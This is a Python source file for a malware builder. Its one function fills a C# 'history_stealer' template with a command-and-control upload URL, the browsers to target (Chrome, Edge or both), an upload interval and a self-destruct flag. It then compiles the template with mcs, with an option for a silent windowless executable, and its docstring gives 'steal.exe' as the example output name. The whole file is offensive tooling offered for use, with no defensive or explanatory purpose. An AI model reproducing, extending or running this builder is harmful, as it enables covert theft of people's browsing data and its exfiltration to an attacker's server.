#!/usr/bin/env python3
import os
import subprocess
import re

def build_executable(exe_name, upload_url, target_browser, upload_interval, self_destruct, silent, output_dir="static/builds"):
    """
    Build the C# executable with specified configuration.
    
    Args:
        exe_name (str): Name of the output executable (e.g., steal.exe)
        upload_url (str): The C2 URL for uploads
        target_browser (int): 0=Chrome, 1=Edge, 2=Both
        upload_interval (int): Hours between uploads (0 for once)
        self_destruct (bool): Enable self-destruction
        silent (bool): Compile as Windows app (no console)
        output_dir (str): Directory to save the compiled executable
    
    Returns:
        tuple: (bool, str) - (Success status, Output filename or error message)
    """
    base_dir = os.path.dirname(os.path.abspath(__file__))  # webapp directory
    source_file = os.path.join(base_dir, "..", "history_stealer", "Program.cs")
    temp_file = os.path.join(base_dir, f"Program_temp_{os.urandom(8).hex()}.cs")
    output_exe = os.path.join(base_dir, output_dir, exe_name)

    # Validate inputs
    if not upload_url.startswith(("http://", "https://")):
        return False, "Upload URL must start with http:// or https://"
    if target_browser not in [0, 1, 2]:
        return False, "Target browser must be 0 (Chrome), 1 (Edge), or 2 (Both)"
    if not isinstance(upload_interval, int) or upload_interval < 0:
        return False, "Upload interval must be a non-negative integer"
    if not os.path.exists(source_file):
        return False, f"Source file {source_file} not found"

    # Map target_browser to string
    target_map = {0: "CHROME", 1: "EDGE", 2: "BOTH"}
    target = target_map[target_browser]

    # Ensure output directory exists
    os.makedirs(os.path.join(base_dir, output_dir), exist_ok=True)

    # Read the original Program.cs
    try:
        with open(source_file, "r") as f:
            content = f.read()
    except Exception as e:
        return False, f"Failed to read {source_file}: {str(e)}"

    # Replace configuration values
    content = re.sub(
        r'public static readonly string C2Url = "[^"]*";',
        f'public static readonly string C2Url = "{upload_url}";',
        content
    )
    content = re.sub(
        r'public static readonly string Target = "[^"]*";',
        f'public static readonly string Target = "{target}";',
        content
    )
    content = re.sub(
        r'public static readonly int Hours = \d+;',
        f'public static readonly int Hours = {upload_interval};',
        content
    )
    content = re.sub(
        r'public static readonly bool SelfDestruct = (true|false);',
        f'public static readonly bool SelfDestruct = {str(self_destruct).lower()};',
        content
    )

    # Write modified content to temporary file
    try:
        with open(temp_file, "w") as f:
            f.write(content)
    except Exception as e:
        return False, f"Failed to write temporary file: {str(e)}"

    # mcs command to compile
    mcs_command = [
        "mcs",
        "-sdk:4.5",
        f"-target:{'winexe' if silent else 'exe'}",
        f"-out:{output_exe}",
        "-platform:x64",
        "-r:/usr/lib/mono/4.5/System.Net.Http.dll",
        "-r:/usr/lib/mono/4.5/System.IO.Compression.dll",
        "-r:/usr/lib/mono/4.5/System.IO.Compression.FileSystem.dll",
        "-r:" + os.path.join(base_dir, "..", "history_stealer", "Newtonsoft.Json.dll"),
        "-langversion:7.1",
        temp_file
    ]

    try:
        subprocess.run(mcs_command, check=True, capture_output=True, text=True)
        return True, output_exe
    except subprocess.CalledProcessError as e:
        return False, f"Compilation failed: {e.stderr}"
    except FileNotFoundError:
        return False, "mcs compiler not found. Install mono-complete with 'sudo apt install mono-complete'"
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
